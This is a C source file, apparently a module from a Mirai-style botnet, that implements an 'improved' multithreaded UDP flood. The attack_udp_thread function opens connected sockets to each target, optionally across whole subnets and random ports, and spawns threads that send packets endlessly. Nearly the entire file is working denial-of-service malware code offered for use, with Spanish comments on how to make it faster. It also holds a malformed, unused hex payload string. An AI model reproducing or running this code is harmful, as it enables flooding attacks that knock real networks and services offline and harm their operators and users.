#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <poll.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <pthread.h>

// Local header files

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "table.h"
#include "protocol.h"

#define MAX_THREADS 100

static unsigned long int Q[4096], c = 362436;

char *hexPayload = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A";

char random_hex() {
    char hexs[] = {'\x0', '\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07', '\x08', '\x09', '\x0a', '\x0b', '\x0c', '\x0d', '\x0e', '\x0f', '\x10', '\x11', '\x12', '\x13', '\x14', '\x15', '\x16', '\x17', '\x18', '\x19', '\x1a', '\x1b', '\x1c', '\x1d', '\x1e', '\x1f', '\x20', '\x21', '\x22', '\x23', '\x24', '\x25', '\x26', '\x27', '\x28', '\x29', '\x2a', '\x2b', '\x2c', '\x2d', '\x2e', '\x2f', '\x30', '\x31', '\x32', '\x33', '\x34', '\x35', '\x36', '\x37', '\x38', '\x39', '\x3a', '\x3b', '\x3c', '\x3d', '\x3e', '\x3f', '\x40', '\x41', '\x42', '\x43', '\x44', '\x45', '\x46', '\x47', '\x48', '\x49', '\x4a', '\x4b', '\x4c', '\x4d', '\x4e', '\x4f', '\x50', '\x51', '\x52', '\x53', '\x54', '\x55', '\x56', '\x57', '\x58', '\x59', '\x5a', '\x5b', '\x5c', '\x5d', '\x5e', '\x5f', '\x60', '\x61', '\x62', '\x63', '\x64', '\x65', '\x66', '\x67', '\x68', '\x69', '\x6a', '\x6b', '\x6c', '\x6d', '\x6e', '\x6f', '\x70', '\x71', '\x72', '\x73', '\x74', '\x75', '\x76', '\x77', '\x78', '\x79', '\x7a', '\x7b', '\x7c', '\x7d', '\x7e', '\x7f', '\x80', '\x81', '\x82', '\x83', '\x84', '\x85', '\x86', '\x87', '\x88', '\x89', '\x8a', '\x8b', '\x8c', '\x8d', '\x8e', '\x8f', '\x90', '\x91', '\x92', '\x93', '\x94', '\x95', '\x96', '\x97', '\x98', '\x99', '\x9a', '\x9b', '\x9c', '\x9d', '\x9e', '\x9f', '\xa0', '\xa1', '\xa2', '\xa3', '\xa4', '\xa5', '\xa6', '\xa7', '\xa8', '\xa9', '\xaa', '\xab', '\xac', '\xad', '\xae', '\xaf', '\xb0', '\xb1', '\xb2', '\xb3', '\xb4', '\xb5', '\xb6', '\xb7', '\xb8', '\xb9', '\xba', '\xbb', '\xbc', '\xbd', '\xbe', '\xbf', '\xc0', '\xc1', '\xc2', '\xc3', '\xc4', '\xc5', '\xc6', '\xc7', '\xc8', '\xc9', '\xca', '\xcb', '\xcc', '\xcd', '\xce', '\xcf', '\xd0', '\xd1', '\xd2', '\xd3', '\xd4', '\xd5', '\xd6', '\xd7', '\xd8', '\xd9', '\xda', '\xdb', '\xdc', '\xdd', '\xde', '\xdf', '\xe0', '\xe1', '\xe2', '\xe3', '\xe4', '\xe5', '\xe6', '\xe7', '\xe8', '\xe9', '\xea', '\xeb', '\xec', '\xed', '\xee', '\xef', '\xf0', '\xf1', '\xf2', '\xf3', '\xf4', '\xf5', '\xf6', '\xf7', '\xf8', '\xf9', '\xfa', '\xfb', '\xfc', '\xfd', '\xfe', '\xff'};

    int length = sizeof(hexs) / sizeof(hexs[0]);

    return rand() % (length + 1);
}

void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}

unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1; // include max_num in output
    } else {
        low_num = max_num + 1; // include max_num in output
        hi_num = min_num;
    }

    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

unsigned short csum (unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum);
}


// Estructura para pasar datos a los hilos
struct thread_data {
    int thread_id;
    int socket_fd;
    uint16_t data_len;
    BOOL data_rand;
    char *static_packet;  // Buffer fijo si no se aleatoriza
};

// Función del hilo mejorada
void* send_udp_packets(void* thread_arg) {
    struct thread_data* data = (struct thread_data*) thread_arg;
    int socket_fd = data->socket_fd;
    uint16_t data_len = data->data_len;
    BOOL data_rand = data->data_rand;
    char *packet;

    if (data_rand) {
        packet = calloc(data_len, sizeof(char));
        if (packet == NULL) pthread_exit(NULL);
    } else {
        packet = data->static_packet;  // Usamos el buffer predefinido
    }

    while (TRUE) {
        if (data_rand) {
            rand_str(packet, data_len);  // Solo se randomiza si es necesario
        }
        // Enviar por socket conectado (más rápido que sendto)
        send(socket_fd, packet, data_len, MSG_NOSIGNAL);
    }

    if (data_rand) free(packet);
    pthread_exit(NULL);
}

// Versión mejorada de attack_udp_thread
void attack_udp_thread(uint8_t targs_len, struct attack_target* targs, uint8_t opts_len, struct attack_option* opts) {
    int i, t;
    // Número de hilos por objetivo, configurable con la flag "conns" (por defecto 4)
    int threads_per_target = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 4);
    int total_threads = targs_len * threads_per_target;
    pthread_t *threads = calloc(total_threads, sizeof(pthread_t));
    struct thread_data *thread_data_array = calloc(total_threads, sizeof(struct thread_data));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    // Aumentamos tamaño de paquete por defecto a 1460 bytes
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1460);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    if (sport == 0xffff) {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }

    // Buffer estático para cuando no se necesita aleatoriedad (relleno con ceros)
    char *static_packet = NULL;
    if (!data_rand) {
        static_packet = calloc(data_len, sizeof(char));
        if (static_packet == NULL) return;
        // Opcional: rellenar con un patrón fijo en lugar de ceros
        // memset(static_packet, 0x55, data_len);
    }

    int thread_idx = 0;
    for (i = 0; i < targs_len; i++) {
        for (t = 0; t < threads_per_target; t++) {
            struct sockaddr_in bind_addr = {0};
            int socket_fd;

            // Puerto destino aleatorio si no se especificó
            if (dport == 0xffff)
                targs[i].sock_addr.sin_port = rand_next() & 0xffff;
            else
                targs[i].sock_addr.sin_port = htons(dport);

            if ((socket_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
                continue;
            }

            bind_addr.sin_family = AF_INET;
            bind_addr.sin_port = sport;
            bind_addr.sin_addr.s_addr = INADDR_ANY;

            // Bind al puerto fuente (opcional)
            bind(socket_fd, (struct sockaddr*) &bind_addr, sizeof(struct sockaddr_in));

            // Para ataques con máscara de red (ej. /24)
            if (targs[i].netmask < 32) {
                targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t) rand_next()) >> targs[i].netmask));
            }

            // Conectamos el socket (ahora podemos usar send)
            connect(socket_fd, (struct sockaddr*) &targs[i].sock_addr, sizeof(struct sockaddr_in));

            struct thread_data* thread_data = &thread_data_array[thread_idx];
            thread_data->thread_id = thread_idx;
            thread_data->socket_fd = socket_fd;
            thread_data->data_len = data_len;
            thread_data->data_rand = data_rand;
            thread_data->static_packet = static_packet;

            pthread_create(&threads[thread_idx], NULL, send_udp_packets, (void*) thread_data);
            thread_idx++;
        }
    }

    // Mantenemos el proceso vivo hasta que el temporizador lo mate
    while (1) {
        sleep(1);
    }

    // Liberar recursos (nunca se alcanza)
    if (static_packet) free(static_packet);
    free(threads);
    free(thread_data_array);
}
